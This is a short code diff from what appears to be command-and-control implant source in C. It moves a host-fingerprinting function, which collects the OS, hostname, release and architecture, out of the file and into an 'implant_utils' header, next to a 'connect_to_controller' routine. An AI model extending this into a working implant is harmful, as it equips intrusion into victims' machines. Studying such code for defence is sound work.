@@ -8,41 +8,7 @@
 #include <string.h>
 #include "protocol.h"
 #include <stdlib.h>
-#ifdef _WIN32
-#include <windows.h>
-#elif __linux__ || __APPLE__
-#include <sys/utsname.h>
-#endif
-
-char *operating_system_info()
-{
-    char *os_info = malloc(512);
-
-#ifdef _WIN32
-    // Windows specific
-    OSVERSIONINFO version;
-    version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-    GetVersionEx(&version);
-    snprintf(os_info, 512, "Windows | %lu.%lu",
-             version.dwMajorVersion,
-             version.dwMinorVersion);
-
-#elif __linux__ || __APPLE__
-    // Unix/Linux/Mac
-    struct utsname info;
-    uname(&info);
-    snprintf(os_info, 512, "%s | %s | %s | %s",
-             info.sysname,
-             info.nodename,
-             info.release,
-             info.machine);
-#else
-    snprintf(os_info, 512, "Unknown OS");
-#endif
-
-    return os_info;
-}
-
+#include "implant_utils.h"
 int connect_to_controller()
 {
 
